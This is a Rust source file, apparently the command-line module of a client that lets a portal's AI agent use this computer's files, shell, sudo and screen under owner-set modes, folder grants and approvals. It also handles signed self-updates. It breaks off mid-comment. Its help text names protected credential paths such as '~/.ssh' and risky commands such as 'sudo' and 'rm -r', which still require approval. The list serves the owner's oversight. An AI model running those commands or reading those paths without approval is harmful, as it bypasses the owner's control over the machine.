//! The command line. Everything but `run` is a short-lived command that edits the
//! config as the owner, or talks to the running client over the control channel.

use std::path::{Path, PathBuf};
use std::process::ExitCode;

use clap::{Parser, Subcommand, ValueEnum};
use sync_connector::pair;
use sync_ops::info;
use sync_policy::config::{Elevation, SecretStorage};
use sync_policy::{Access, DeviceConfig, Dirs, FolderGrant, Mode, Policy, Profile};

use crate::actions::{self, Action};
use crate::config_cmd::{self, Op};
use crate::control::{self, Reply, Request, Status};
use crate::{install, owner, setup};
use sync_proto::methods::{ApprovalInfo, Choice};

#[derive(Parser)]
#[command(
    name = "pithagoras-sync",
    version,
    about = "Lets a Pithagoras portal's agent reach this computer's files and shell, within the limits you set here."
)]
pub struct Cli {
    /// More log output.
    #[arg(short, long, global = true)]
    pub verbose: bool,
    /// Without one: the help in a terminal, the graphical flow from a file
    /// manager or the menu.
    #[command(subcommand)]
    pub cmd: Option<Cmd>,
}

#[derive(Subcommand)]
pub enum Cmd {
    /// Run the client in this terminal, by hand (for debugging).
    ///
    /// You normally never need this: `install` already starts the client for you,
    /// in the background and at every login (a systemd unit, or a logon task on
    /// Windows), and that is what runs this command.
    Run {
        /// Run without a console (the Windows logon task): let go of the console
        /// window and write the log to `client.log` in the state folder.
        #[arg(long, hide = true)]
        detach: bool,
    },
    /// Install, pair and uninstall in windows instead of a terminal.
    ///
    /// The menu entry and a double click on the program start it, and so does a
    /// pairing link (pithagoras-sync://pair?...) opened in the browser: it asks
    /// before it installs, pairs (showing the portal it would pair with) or
    /// uninstalls. Needs zenity or kdialog on Linux.
    Gui {
        /// A pairing link to pair with (after asking).
        link: Option<String>,
        /// The same, as an option.
        #[arg(long = "link", value_name = "LINK", conflicts_with = "link")]
        link_option: Option<String>,
    },
    /// Pair with a portal, using the URI it shows under Settings, Devices.
    Pair {
        uri: String,
        /// Device name shown in the portal (a-z, 0-9 and -, up to 24); default from
        /// the host name.
        #[arg(long)]
        name: Option<String>,
    },
    /// Forget the pairing. Remove the device in the portal as well.
    Unpair,
    /// Show what the client is doing.
    Status {
        #[arg(long)]
        json: bool,
    },
    /// Stop everything at once: close the link, kill every command, deny every call
    /// until `unlock`.
    Panic,
    /// End a pause.
    Unlock,
    /// Show or hide the quick-ask overlay (comes with the desktop app, phase 2).
    Toggle,
    /// Show the mode, or set it: ask, folders or full
    ///
    /// The mode decides what the portal's agent may do on this computer. Without
    /// an argument this shows the current one.
    ///
    ///   ask      Every file access and every command asks you, except the
    ///            commands on `policy.commands.never_ask`. You answer in the
    ///            portal's Devices tab, or here with `approvals`, `approve` and
    ///            `deny`. This is the default.
    ///
    ///   folders  Files only inside the folders you granted with `folder add`
    ///            (read-only unless --rw); commands only in folders granted with
    ///            --exec. On Linux 5.13 or newer commands run under Landlock and
    ///            can write only in read-write folders; without Landlock each
    ///            command asks. Everything outside the folders is refused, except
    ///            the files `policy.allow_globs` names.
    ///
    ///   full     The agent acts with all your rights and is mostly not asked.
    ///            What still asks: protected paths (`~/.ssh` and the like) and
    ///            risky commands (`sudo`, `git push`, `rm -r` outside the working
    ///            folder), until you switch those prompts off in the settings;
    ///            calls from a chat that has seen untrusted content
    ///            (`policy.full.taint_prompts`); the commands on
    ///            `policy.commands.always_ask`; and every `sudo` command while
    ///            sudo access is on.
    ///            Full falls back to ask after --expiry-hours (default 8; 0 never).
    ///
    /// Only you change the mode, on this computer. The portal can change it only
    /// if you set `portal_policy` to `write` (the default is `read`: it sees the
    /// settings and cannot change them).
    #[command(verbatim_doc_comment)]
    Mode {
        /// ask, folders or full (`--help` explains them).
        mode: Option<ModeArg>,
        /// Hours until Full falls back to ask (0: never). Default 8.
        #[arg(long)]
        expiry_hours: Option<u32>,
    },
    /// The folders the portal may use in Folders mode.
    Folder {
        #[command(subcommand)]
        cmd: FolderCmd,
    },
    /// Show or change any setting by name (docs/permissions.md lists them).
    Config {
        #[command(subcommand)]
        cmd: ConfigCmd,
    },
    /// The calls waiting for your approval.
    Approvals {
        #[arg(long)]
        json: bool,
    },
    /// Allow a waiting call: once, or with --chat or --minutes for more calls of its
    /// kind from the same chat.
    Approve {
        id: u64,
        #[arg(long)]
        chat: bool,
        #[arg(long, conflicts_with = "chat")]
        minutes: Option<u32>,
    },
    /// Refuse a waiting call.
    Deny { id: u64 },
    /// Let the portal's agent run `sudo <command>` here (Linux only).
    ///
    /// The password sudo asks for is typed here and never sent to the portal.
    /// Two steps: `sudo set` stores the password, `sudo activate` switches
    /// sudo access on. `sudo status` shows where you are.
    #[command(arg_required_else_help = true)]
    Sudo {
        #[command(subcommand)]
        cmd: SudoCmd,
    },
    /// Let the portal's agent see the screen and use the pointer and keyboard.
    ///
    /// Computer use goes through an MCP server the client installs and runs
    /// itself (computer-use-linux on Linux, Windows-MCP on Windows). It is as
    /// strong as Full mode: the agent can click and type anything you can, a
    /// terminal included. It is off until you say `ask` or `allow`.
    #[command(name = "computer-use", arg_required_else_help = true)]
    ComputerUse {
        #[command(subcommand)]
        cmd: ComputerUseCmd,
    },
    /// Replace this program with a newer signed release, and restart the
    /// client; update the computer-use server to the newest signed pins too.
    Update {
        /// Only say whether there is one.
        #[arg(long)]
        check: bool,
        /// The release manifest: an https URL, or a local file.
        #[arg(long)]
        manifest: Option<String>,
    },
    /// Start the client with the machine (systemd unit, or a logon task on Windows).
    Install {
        /// A system unit instead of a user unit (run as root).
        #[arg(long)]
        system: bool,
        /// With --system: the user the client runs as (default: root).
        #[arg(long, requires = "system")]
        user: Option<String>,
        /// Do not enable lingering for a user unit on a machine without a desktop.
        #[arg(long)]
        no_linger: bool,
        /// Install the computer-use server too (`computer-use install`).
        #[arg(long)]
        computer_use: bool,
        /// Only show what would be done.
        #[arg(long)]
        print: bool,
    },
    /// Undo `install` (config, pairing and the program stay; with --purge only the
    /// program stays).
    Uninstall {
        #[arg(long)]
        system: bool,
        /// Also remove the pairing, the config, the logs and the update records:
        /// everything the client left but the program itself.
        #[arg(long)]
        purge: bool,
        /// With --purge: do not ask before removing.
        #[arg(short, long, requires = "purge")]
        yes: bool,
        /// Only show what would be done.
        #[arg(long)]
        print: bool,
    },
    /// On a server, as root: create (or remove) a dedicated user running the client.
    Setup {
        #[arg(long, conflicts_with = "remove", required_unless_present = "remove")]
        create_user: bool,
        #[arg(long)]
        remove: bool,
        #[arg(long, default_value = setup::DEFAULT_USER)]
        name: String,
        /// Do not ask before making the changes.
        #[arg(short, long)]
        yes: bool,
        /// Only show what would be done.
        #[arg(long)]
        print: bool,
    },
}

#[derive(Clone, Copy, ValueEnum)]
pub enum ModeArg {
    /// Every file access and command asks you.
    Ask,
    /// Files only in the folders you granted; commands under Landlock.
    Folders,
    /// All your rights, no questions but the protected paths and risky commands.
    Full,
}

impl From<ModeArg> for Mode {
    fn from(m: ModeArg) -> Mode {
        match m {
            ModeArg::Ask => Mode::Ask,
            ModeArg::Folders => Mode::Folders,
            ModeArg::Full => Mode::Full,
        }
    }
}

#[derive(Subcommand)]
pub enum ConfigCmd {
    /// Print one setting, or all of them.
    Get { key: Option<String> },
    /// `config set policy.tools.bash false`; values are JSON or text.
    Set { key: String, value: String },
    /// Back to the default.
    Unset { key: String },
    /// Add an entry to a list: `config add policy.deny '{"path": "~/secret"}'`.
    Add { key: String, value: String },
    /// Take an entry out of a list.
    Remove { key: String, value: String },
}

#[derive(Subcommand)]
pub enum SudoCmd {
    /// Store the password sudo asks you for (typed here, not shown), then
    /// offer to switch sudo access on.
    Set {
        /// Read the password from stdin (one line) instead of the terminal, for
        /// a script. Nothing is asked then.
        #[arg(long)]
        stdin: bool,
        /// Switch sudo access on without asking. Without it, a question asks
        /// in a terminal, and a script only gets a hint.
        #[arg(long)]
        activate: bool,
    },
    /// Switch sudo access on: the agent may then run `sudo <command>`; each
    /// such command still asks for your approval, except the ones on
    /// `policy.commands.never_ask` and when the client runs as root, where
    /// `sudo` is an ordinary command.
    Activate {
        /// Switch it on without a stored password, for a sudoers rule that asks
        /// none.
        #[arg(long)]
        no_password: bool,
    },
    /// Switch sudo access off. The stored password stays (`sudo clear` forgets
    /// it), and a portal that may write settings (`portal_policy = write`) can
    /// switch sudo access on again.
    Deactivate,
    /// Forget the stored password, in the running client and on disk.
    Clear {
        /// Also switch sudo access off, without asking. Without it, a question
        /// asks in a terminal, and a script keeps it on.
        #[arg(long)]
        deactivate: bool,
    },
    /// Show whether sudo access is on, whether a password is stored, and what
    /// to do next.
    Status,
}

#[derive(Subcommand)]
pub enum ComputerUseCmd {
    /// Download the pinned server, check its hash, test that it starts.
    Install {
        /// Only show what would be done.
        #[arg(long)]
        print: bool,
    },
    /// Remove the server (the rest of the client stays).
    Uninstall,
    /// The server, its pin, whether it answers, the consent and the setup.
    Status {
        #[arg(long)]
        json: bool,
    },
    /// The steps the server needs on this desktop, one by one; nothing changes
    /// without your yes.
    Setup {
        /// Carry out every step that can be, without asking.
        #[arg(short, long)]
        yes: bool,
    },
    /// Take a screenshot and move the pointer 10 px and back.
    Test {
        /// Every tool the server offers, and which are allowed.
        #[arg(long)]
        verbose: bool,
    },
    /// Allow computer use without asking, for at most 8 hours; then it is off.
    Allow {
        #[arg(long)]
        minutes: u32,
    },
    /// Ask in each chat before its first computer-use call (once, for this
    /// chat, or deny).
    Ask,
    /// Refuse every computer-use call (the default).
    Off,
    /// Move the server to the newest signed pins.
    Update {
        /// Only say whether there is a newer version.
        #[arg(long)]
        check: bool,
    },
    /// Go back to the version before the last update.
    Rollback,
}

#[derive(Subcommand)]
pub enum FolderCmd {
    /// Grant a folder, read-only unless --rw; commands run there only with --exec.
    Add {
        path: PathBuf,
        #[arg(long)]
        rw: bool,
        #[arg(long)]
        exec: bool,
    },
    Remove {
        path: PathBuf,
    },
    List,
}

fn now_ms() -> i64 {
    sync_policy::system_clock()()
}

/// Where a client without a console (`run --detach`) writes its log.
pub fn log_file(dirs: &Dirs) -> PathBuf {
    dirs.state.join("client.log")
}

/// Where `gui` notes what it could not show in a window. Not `client.log`: that
/// one existing means the client logs to it rather than to the journal.
pub fn gui_log_file(dirs: &Dirs) -> PathBuf {
    dirs.state.join("gui.log")
}

/// The client's exit code when it stops to be restarted (EX_TEMPFAIL).
pub const RESTART_EXIT: u8 = 75;

/// Root on Linux, an elevated administrator on Windows: what the client refuses to
/// run as until `policy.privilege.allow_root` is on.
pub fn is_root() -> bool {
    crate::daemon::is_root()
}

/// Restarts the system unit when its process runs the file that was at `exe`
/// before (`replaced`: this update just replaced it); what it says about that.
fn restart_unit(exe: &Path, replaced: bool, restarting: Option<u32>) -> Option<String> {
    #[cfg(target_os = "linux")]
    let look = |pid| crate::update::what_runs(pid, exe);
    #[cfg(not(target_os = "linux"))]
    let look = |_| None;
    crate::update::restart_system_unit(&actions::System, exe, replaced, restarting, look)
}

/// This program's file as it was when the program started (`main` asks
/// first). Linux names the file of a running program that was replaced since
/// it started (an update, from a window that stayed open) "<path> (deleted)";
/// the path it started from holds the new file then.
pub fn this_program() -> Result<PathBuf, String> {
    static PROGRAM: std::sync::OnceLock<Result<PathBuf, String>> = std::sync::OnceLock::new();
    PROGRAM
        .get_or_init(|| std::env::current_exe().map_err(|e| e.to_string()))
        .clone()
}

/// What `update` is to do: look (`--check`), or what a window's Yes was
/// given to.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Asked<'a> {
    /// `update --check`: only look, change nothing.
    Check,
    /// No window: the command line, which takes whatever is on offer.
    Anything,
    /// This release and no other.
    Release(&'a str),
    /// No release: the restart of a client that still runs the program the
    /// file replaced.
    Restart,
}

/// What changed on offer since a window asked: the update stops before it
/// changes anything.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Changed {
    /// Another release is on offer than the one asked about.
    Other { asked: String, offered: String },
    /// The release asked about is no longer on offer.
    Gone(String),
    /// A release is on offer where the restart was asked about.
    Offered(String),
}

/// A note of `update` that its other fields do not tell: the command line
/// prints it (`Display`), a window says it in its language.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum UpdateNote {
    /// The program that ran the update is another, unchanged file.
    Unchanged(String),
    /// No client of this user runs the updated program.
    NoClient,
    /// The copy `install` set up (this path) was not updated.
    CopyNotUpdated(String),
    /// Which release was installed could not be recorded (this error).
    NotRecorded(String),
    /// What the system unit's restart did (root only): systemd's words.
    Unit(String),
}

impl std::fmt::Display for UpdateNote {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            UpdateNote::Unchanged(p) => write!(f, "The one you ran, {p}, is unchanged."),
            UpdateNote::NoClient => write!(
                f,
                "No client of this user runs it. A client run by a system unit restarts with: sudo systemctl restart pithagoras-sync"
            ),
            UpdateNote::CopyNotUpdated(p) => write!(
                f,
                "The copy `install` set up, {p}, which the unit or logon task starts, was not updated: run `{p} update` for it."
            ),
            UpdateNote::NotRecorded(e) => write!(f, "pithagoras-sync: {e}"),
            UpdateNote::Unit(l) => f.write_str(l),
        }
    }
}

/// What is on offer (`offered`, `None`: nothing newer) is what the window
/// asked the owner about, or the update stops before it changes anything.
fn the_version_asked_about(offered: Option<&str>, asked: Asked) -> Result<(), Changed> {
    match (offered, asked) {
        (Some(o), Asked::Release(v)) if o != v => Err(Changed::Other {
            asked: v.to_string(),
            offered: o.to_string(),
        }),
        (None, Asked::Release(v)) => Err(Changed::Gone(v.to_string())),
        (Some(o), Asked::Restart) => Err(Changed::Offered(o.to_string())),
        _ => Ok(()),
    }
}

/// What `update` did or found.
pub struct Update {
    /// `--check`: the newer release on offer.
    pub available: Option<String>,
    /// The version of the program an update replaces, as it was before.
    pub current: String,
    /// When the newest release was made (UTC).
    pub released: String,
    /// The version this user's client runs when it is older than `current`:
    /// it still runs the program the file replaced.
    pub stale_client: Option<String>,
    /// The release this update installed.
    pub installed: Option<String>,
    /// Whether this user's client took the request to restart.
    pub restarted: bool,
    /// What changed on offer since the window asked: nothing was done.
    pub changed: Option<Changed>,
    /// Whether a client of this user runs the program `update` replaces,
    /// and so is asked to restart with the new one.
    pub client: bool,
    /// What the fields above do not tell.
    pub notes: Vec<UpdateNote>,
}

/// `update` with the release manifest at `manifest` (else the release
/// channel's). `asked`: `Check` only looks; else what a window showed the
/// owner, and anything else on offer is refused (`Update::changed`). `say`
/// gets what the command line prints, line by line, as it happens.
pub async fn update(
    dirs: &Dirs,
    manifest: Option<&str>,
    asked: Asked<'_>,
    say: &mut dyn FnMut(&str),
) -> Result<Update, String> {
    let check = asked == Asked::Check;
    owner::not_from_own_command(dirs).await?;
    let key = crate::update::PUBLIC_KEY
        .ok_or("this build has no update key; updates come with release builds")?;
    let source = manifest.unwrap_or(crate::update::DEFAULT_MANIFEST);
    let me = this_program()?;
    // The copy the running client was started from, which its unit or
    // logon task starts again, not necessarily the one run here (a
    // download, while the installed copy is not on PATH).
    let running = match control::send(&dirs.socket(), Request::Status).await {
        Ok(Some(r)) => r.status.map(|s| (PathBuf::from(s.exe), s.version, s.pid)),
        _ => None,
    };
    // This user's client's process, for the system unit's restart below.
    let running_pid = running.as_ref().map(|r| r.2);
    let running = running.as_ref().map(|(p, v, _)| (p.as_path(), v.as_str()));
    // As root, the program of the system unit (`setup`'s dedicated user),
    // whose client root cannot reach over its control socket.
    let system = if cfg!(target_os = "linux") && is_root() {
        crate::update::unit_program(&actions::System)
    } else {
        None
    };
    // The unit's program is checked before root runs it to learn its
    // version, and only the checked path is used from here on.
    let target = crate::update::choose_target(
        running.map(|(p, _)| p),
        system.as_deref(),
        &me,
        &crate::update::RealFs,
    )?;
    let exe = target.exe;
    let unit_runs_exe = target.unit;
    let runs_exe = |p: &Path| p.is_absolute() && crate::update::same_program(p, &exe);
    let client = running.filter(|(p, _)| runs_exe(p));
    // Whether a release is newer is decided by the program it replaces,
    // as it is on disk.
    let mine = env!("CARGO_PKG_VERSION");
    // A unit's program that went missing is put back by any release.
    let missing = unit_runs_exe && std::fs::symlink_metadata(&exe).is_err();
    let (current, about) = match crate::update::version_of(&exe) {
        Some(v) => (v.clone(), format!("{} is {v}", exe.display())),
        None if missing => ("0.0.0".to_string(), format!("{} is missing", exe.display())),
        None => {
            let v = crate::update::current_version(client, mine);
            let whose = if client.is_some_and(|(_, cv)| cv == v) {
                "the running client is"
            } else {
                "this is"
            };
            (v.to_string(), format!("{whose} {v}"))
        }
    };
    let records = [dirs.update_seen_file(&exe), dirs.update_user_seen_file()];
    let offer = crate::update::check(source, key, &current, &[&records[0], &records[1]]).await?;
    // The date shows a release listing that stopped moving.
    let released = crate::update::utc(offer.released);
    // The process of this user's client once it was asked to restart: it
    // may be the system unit's own (a unit for root), which then needs
    // no second restart.
    let mut restarting = None;
    let mut update = Update {
        available: None,
        current: current.clone(),
        released: released.clone(),
        stale_client: client
            .filter(|(_, v)| crate::update::is_older(v, &current))
            .map(|(_, v)| v.to_string()),
        installed: None,
        restarted: false,
        changed: None,
        client: client.is_some(),
        notes: Vec::new(),
    };
    // `say!`: a line the fields of `Update` tell as well; `note!`: one they
    // do not.
    macro_rules! say {
        ($($arg:tt)*) => {
            say(&format!($($arg)*))
        };
    }
    macro_rules! note {
        ($note:expr) => {{
            let n = $note;
            say(&n.to_string());
            update.notes.push(n);
        }};
    }
    if let Err(c) = the_version_asked_about(offer.plan.as_ref().map(|p| p.version.as_str()), asked)
    {
        update.changed = Some(c);
        return Ok(update);
    }
    let Some(plan) = offer.plan else {
        // The file is current, but this user's client may still run the
        // one it replaced (`install` run again from a newer download).
        match update.stale_client.as_deref() {
            None => {
                say!("Up to date ({about}; the newest release was made {released}).")
            }
            Some(v) => {
                say!(
                    "{} is up to date ({current}; the newest release was made {released}), but the running client is still {v}.",
                    exe.display()
                );
                if check {
                    say!("`pithagoras-sync update` restarts it.");
                } else if matches!(
                    control::send(&dirs.socket(), Request::Restart).await,
                    Ok(Some(r)) if r.ok
                ) {
                    restarting = running_pid;
                    update.restarted = true;
                    say!(
                        "It restarts with the current program (its unit or logon task starts it again)."
                    );
                } else {
                    say!("It did not take the request to restart: restart its unit or logon task.");
                }
            }
        }
        // The file is current, but the unit may still run the one it
        // replaced (an update whose restart failed, or a copy by hand).
        if unit_runs_exe
            && !check
            && let Some(l) = restart_unit(&exe, false, restarting)
        {
            note!(UpdateNote::Unit(l));
        }
        return Ok(update);
    };
    if check {
        say!(
            "Version {} is available, released {released} ({about}).",
            plan.version
        );
        update.available = Some(plan.version);
        return Ok(update);
    }
    crate::update::install(&plan, &exe).await?;
    update.installed = Some(plan.version.clone());
    say!("Updated {} to {}.", exe.display(), plan.version);
    // No program of this user is taken below this release from now on.
    if let Err(e) = crate::update::record(&records[1], offer.released) {
        let n = UpdateNote::NotRecorded(e);
        eprintln!("{n}");
        update.notes.push(n);
    }
    if !crate::update::same_program(&exe, &me) {
        note!(UpdateNote::Unchanged(me.display().to_string()));
    }
    let restarted = client.is_some()
        && matches!(
            control::send(&dirs.socket(), Request::Restart).await,
            Ok(Some(r)) if r.ok
        );
    if restarted {
        say!("The running client restarts with it (its unit or logon task starts it again).");
        restarting = running_pid;
        update.restarted = true;
    }
    // Root's own client and the dedicated user's unit may run the same
    // file: both restart.
    if unit_runs_exe {
        if let Some(l) = restart_unit(&exe, true, restarting) {
            note!(UpdateNote::Unit(l));
        }
    } else if !restarted {
        note!(UpdateNote::NoClient);
        if let Some(other) = crate::update::installed_copy(&me) {
            note!(UpdateNote::CopyNotUpdated(other.display().to_string()));
        }
    }
    Ok(update)
}

/// What `pair` says when it runs as root or elevated. The client itself refuses to
/// run that way unless the owner allowed it, so the warning says so instead of
/// leaving the owner with a client that does not start.
pub fn root_warning(windows: bool, allow_root: bool) -> String {
    let who = if windows {
        "an elevated administrator"
    } else {
        "root"
    };
    let safer = if windows {
        "the logon task from `pithagoras-sync install` runs it without elevation"
    } else {
        "a dedicated user is safer (see `pithagoras-sync setup --create-user`)"
    };
    if allow_root {
        format!(
            "warning: pairing as {who}. The portal's agent will act with these rights wherever the policy allows; {safer}."
        )
    } else {
        format!(
            "warning: pairing as {who}. The client refuses to run as {who} until you allow it with `pithagoras-sync config set policy.privilege.allow_root true` (off by default); {safer}."
        )
    }
}

/// The profile of a fresh config: desktop where a person uses the machine (owner
/// confirmations ask for the password there). Windows counts as headless in
/// phase 1, which has no password dialog there.
fn detect_profile() -> Profile {
    if cfg!(windows) || is_root() || info::session() == "headless" {
        Profile::Headless
    } else {
        Profile::Desktop
    }
}

async fn reload_running(dirs: &Dirs) {
    match control::send(&dirs.socket(), Request::Reload).await {
        Ok(Some(r)) if !r.ok => eprintln!(
            "the running client kept its old config: {}",
            r.error.unwrap_or_default()
        ),
        Ok(Some(_)) => println!("The running client took the change."),
        _ => {}
    }
}

/// The config file, or a new config for this machine when there is none yet. The
/// profile is detected once, by whichever command writes the file first, so a
/// `folder add` before `pair` on a desktop does not make it headless.
pub(crate) fn load_config(dirs: &Dirs) -> Result<DeviceConfig, String> {
    // Only a config that is not there means defaults: one this user cannot read
    // (another user's folder) is an error, so nothing writes defaults over it.
    match std::fs::metadata(dirs.config_file()) {
        Ok(_) => return DeviceConfig::load(&dirs.config_file()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
        Err(e) => {
            return Err(format!("cannot read {}: {e}", dirs.config_file().display()));
        }
    }
    let mut cfg = DeviceConfig {
        profile: detect_profile(),
        ..DeviceConfig::default()
    };
    cfg.policy.mode = Policy::default_mode(cfg.profile);
    Ok(cfg)
}

/// Checks that the owner makes a policy change, from outside the client's own
/// commands; returns the config to edit. The config is read again after the
/// confirmation, which can wait for a password: a change made meanwhile stays.
async fn owner_edit(dirs: &Dirs) -> Result<DeviceConfig, String> {
    owner::not_from_own_command(dirs).await?;
    owner::confirm(load_config(dirs)?.profile)?;
    load_config(dirs)
}

fn canonical_folder(p: &Path) -> Result<PathBuf, String> {
    let c = std::fs::canonicalize(p).map_err(|e| format!("{}: {e}", p.display()))?;
    if !c.is_dir() {
        return Err(format!("{} is not a folder", p.display()));
    }
    #[cfg(windows)]
    let c = PathBuf::from(sync_policy::paths::win::strip_verbatim(
        &c.to_string_lossy(),
    ));
    Ok(c)
}

fn mode_text(mode: Mode, expires: Option<i64>) -> String {
    let m = format!("{mode:?}").to_lowercase();
    match (mode, expires) {
        (Mode::Full, Some(t)) => {
            let mins = (t - now_ms()).max(0) / 60_000;
            format!("{m} (falls back in {}h {:02}m)", mins / 60, mins % 60)
        }
        (Mode::Full, None) => format!("{m} (no expiry)"),
        _ => m,
    }
}

fn print_status(s: &Status) {
    print!("{}", status_text(s));
}

/// `status` as printed. The link detail (the portal's close reason, its error
/// texts), the device id it chose and folder paths it may set go through
/// `visible`, so no text from the portal can hide or forge a line of it.
/// Folder access as the config and `folder add` spell it.
fn access_text(a: Access) -> &'static str {
    match a {
        Access::Ro => "ro",
        Access::Rw => "rw",
    }
}

fn status_text(s: &Status) -> String {
    use std::fmt::Write;
    use sync_policy::approve::visible;
    let mut out = String::new();
    let state = format!("{:?}", s.link.state).to_lowercase();
    let _ = writeln!(
        out,
        "pithagoras-sync {}, running as pid {} ({:?})",
        s.version, s.pid, s.profile
    );
    match (&s.portal, &s.name) {
        (Some(p), Some(n)) => {
            let _ = writeln!(
                out,
                "Portal:    {} as {} (device {})",
                visible(p),
                visible(n),
                visible(s.device_id.as_deref().unwrap_or("?"))
            );
        }
        _ => {
            let _ = writeln!(out, "Portal:    not paired");
        }
    }
    if s.portal.is_some() && !s.token_storage.is_empty() {
        let _ = writeln!(out, "Token:     kept in the {}", s.token_storage);
    }
    let _ = writeln!(
        out,
        "Link:      {state}{}",
        s.link
            .detail
            .as_ref()
            .map(|d| format!(": {}", visible(d)))
            .unwrap_or_default()
    );
    if s.paused {
        let _ = writeln!(
            out,
            "PAUSED:    every call is denied until `pithagoras-sync unlock`"
        );
    }
    let _ = writeln!(out, "Mode:      {}", mode_text(s.mode, s.mode_expires_ms));
    if s.folders.is_empty() {
        let _ = writeln!(out, "Folders:   none");
    }
    for f in &s.folders {
        let x = if f.execute { ", exec" } else { "" };
        let _ = writeln!(
            out,
            "Folder:    {} ({}{x})",
            // The client reports it in the portal's form; the owner reads
            // the folder as `folder list` shows it.
            visible(&sync_policy::paths::wire_for_display(&f.path)),
            access_text(f.access)
        );
    }
    let _ = writeln!(
        out,
        "Shell:     {} ({} in Folders mode)",
        visible(&s.shell),
        s.folders_shell
    );
    let _ = writeln!(
        out,
        "Approvals: {}{}",
        s.approvals,
        if s.approvals_waiting > 0 {
            format!(
                " ({} waiting: `pithagoras-sync approvals`)",
                s.approvals_waiting
            )
        } else {
            String::new()
        }
    );
    let _ = writeln!(
        out,
        "Portal:    may {} the settings",
        match s.portal_policy.as_str() {
            "write" => "read and change",
            "read" => "read",
            _ => "not see",
        }
    );
    let _ = writeln!(out, "Elevation: {}", s.elevation);
    if !s.computer_use.is_empty() {
        let _ = writeln!(out, "Computer use: {}", s.computer_use);
    }
    let _ = writeln!(
        out,
        "Commands:  {} running; own cgroup per command: {}; Landlock: {}",
        s.running_commands,
        if s.cgroups { "yes" } else { "no" },
        if s.landlock { "yes" } else { "no" }
    );
    let _ = writeln!(out, "Config:    {}", visible(&s.config_file));
    let _ = writeln!(out, "Audit log: {}", visible(&s.audit_file));
    out
}

/// Where this config keeps the connector token.
pub fn token_store(dirs: &Dirs, cfg: &DeviceConfig) -> sync_connector::token::TokenStore {
    sync_connector::token::TokenStore::new(
        dirs.token_file(),
        cfg.token_storage,
        sync_policy::keyring::system(dirs),
    )
}

/// What a pairing did, for `pair` to print and the GUI to show.
pub struct Paired {
    pub portal: sync_policy::PortalConfig,
    pub mode: Mode,
    pub folders_empty: bool,
    /// The running client took the new pairing.
    pub running: bool,
    /// Said once to the owner: where the token went when the keyring failed.
    pub notes: Vec<String>,
}

/// Pairs with the portal of `uri` and keeps the pairing: the code behind `pair`
/// and the link handler. The caller has checked that the owner makes the change
/// and passes the config it read then.
pub async fn pair_device(
    dirs: &Dirs,
    mut cfg: DeviceConfig,
    uri: &str,
    name: Option<String>,
) -> Result<Paired, String> {
    let name = name
        .or_else(|| cfg.portal.as_ref().map(|p| p.name.clone()))
        .unwrap_or_else(|| pair::name_from_hostname(&info::hostname()));
    let paired = pair::pair(uri, &name).await?;
    let notes = token_store(dirs, &cfg)
        .save(&paired.token)
        .await
        .map_err(|e| {
            format!(
                "{e}. The portal paired the device {} already, but this computer could not keep its token: remove that device in the portal (Settings, Devices) and pair again with a new code",
                sync_policy::approve::visible(&paired.portal.device_id)
            )
        })?
        .into_iter()
        .collect();
    cfg.portal = Some(paired.portal.clone());
    cfg.save(&dirs.config_file())?;
    let running = matches!(
        control::send(&dirs.socket(), Request::Reload).await,
        Ok(Some(_))
    );
    Ok(Paired {
        portal: paired.portal,
        mode: cfg.policy.mode,
        folders_empty: cfg.policy.folders.is_empty(),
        running,
        notes,
    })
}

/// The uninstall after a purge's stop, without the steps the stop took
/// already (on Windows: ending the task).
fn not_again(stop: &[Action], uninstall: Vec<Action>) -> Vec<Action> {
    uninstall
        .into_iter()
        .filter(|a| !stop.contains(a))
        .collect()
}

/// How long `mode full` lasts, for its message.
fn full_for(expiry_hours: u32) -> String {
    match expiry_hours {
        0 => ", with no expiry".into(),
        1 => ", for 1 hour".into(),
        h => format!(", for {h} hours"),
    }
}

/// What `pair` says about a plain-http portal.
pub fn http_note(url: &str) -> Option<String> {
    url.starts_with("http://").then(|| {
        format!(
            "Note: plain http trusts whoever answers on the portal's port on this machine.{}",
            if cfg!(target_os = "linux") {
                " The client talks only to a program of this user or root there; a portal that runs as another user needs https."
            } else {
                " Any local account that listens there while the portal is down gets the token: on a machine shared with other accounts, use https."
            }
        )
    })
}

/// What to do next in this mode, after pairing.
pub fn mode_hint(mode: Mode, folders_empty: bool) -> Option<&'static str> {
    match mode {
        Mode::Ask => Some(
            "Every call waits for your approval (in the portal, or `pithagoras-sync approve`). To let it work in folders of your choice: pithagoras-sync folder add <path> --rw --exec, then pithagoras-sync mode folders.",
        ),
        Mode::Folders if folders_empty => Some(
            "Grant a folder next: pithagoras-sync folder add <path> --rw --exec (nothing is reachable until then).",
        ),
        _ => None,
    }
}

/// How to start a client that does not run yet: the unit `setup` or `install`
/// made for this user, if any.
fn start_hint() -> String {
    let linux = cfg!(target_os = "linux");
    let system = linux
        .then(|| std::fs::read_to_string(crate::update::system_unit_file()).ok())
        .flatten();
    let user_unit = linux && info::home().is_some_and(|h| install::user_unit_file(&h).is_file());
    install::start_hint(system.as_deref(), &info::user().0, user_unit)
}

/// Sends a request to the running client and wants an answer.
async fn to_running(dirs: &Dirs, req: Request) -> Result<Reply, String> {
    match control::send(&dirs.socket(), req).await? {
        Some(r) if r.ok => Ok(r),
        Some(r) => Err(r.error.unwrap_or_default()),
        None => Err("pithagoras-sync is not running".into()),
    }
}

fn print_approval(a: &ApprovalInfo) {
    print!("{}", approval_text(a, now_ms()));
}

/// An approval as `approvals` shows it. Everything from the portal goes through
/// `visible`, and every line but the header is indented, so no text of the call
/// can redraw the screen or pass for another approval's `#id` line.
fn approval_text(a: &ApprovalInfo, now: i64) -> String {
    use std::fmt::Write;
    use sync_policy::approve::visible;
    let secs = (a.expires_ms - now).max(0) / 1000;
    let mut out = String::new();
    let mut target = a.target.split('\n');
    let _ = writeln!(
        out,
        "#{} chat {}: {} {}",
        a.id,
        visible(&a.chat),
        visible(&a.tool),
        visible(target.next().unwrap_or_default())
    );
    // A command of several lines: the rest under the header.
    for l in target {
        let _ = writeln!(out, "    > {}", visible(l));
    }
    // Where a command runs: the same command means something else elsewhere.
    if let Some(cwd) = &a.cwd {
        let _ = writeln!(out, "    in: {}", visible(cwd));
    }
    for r in &a.reasons {
        let _ = writeln!(out, "    why: {}", visible(r));
    }
    // The whole preview (the device cuts it at 2000 bytes and then says how much
